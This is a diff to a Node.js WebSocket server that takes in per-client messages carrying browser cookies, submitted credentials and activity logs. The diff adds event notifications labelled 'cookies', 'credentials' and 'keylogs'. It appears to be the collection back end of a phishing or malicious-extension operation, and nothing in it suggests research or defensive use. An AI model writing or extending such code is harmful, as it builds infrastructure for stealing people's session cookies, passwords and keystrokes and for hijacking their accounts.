@@ -1,7 +1,7 @@
 const express = require("express");
 const WebSocket = require("ws");
 const db = require("./db"); // Adjust the path as necessary
-const { socketMaps } = require("./sharedData");
+const { socketMaps, sendEvent } = require("./sharedData");
 
 module.exports = function initializeClientApi(appClients, server) {
   appClients.use(express.json());
@@ -21,15 +21,19 @@ module.exports = function initializeClientApi(appClients, server) {
         switch (data[0]) {
           case "setcookies":
             handleSetCookies(client_id, data[1]);
+            sendEvent("cookies", client_id);
             break;
           case "updatecookie":
             handeUpdateCookie(client_id, data[1]);
+            sendEvent("cookies", client_id);
             break;
           case "addsubmittedcredentials":
             handleAddSubmittedCredentials(client_id, data[1]);
+            sendEvent("credentials", client_id);
             break;
           case "activitylog":
             handleActivityLog(client_id, data[1]);
+            sendEvent("keylogs", client_id);
             break;
         }
       } catch (err) {
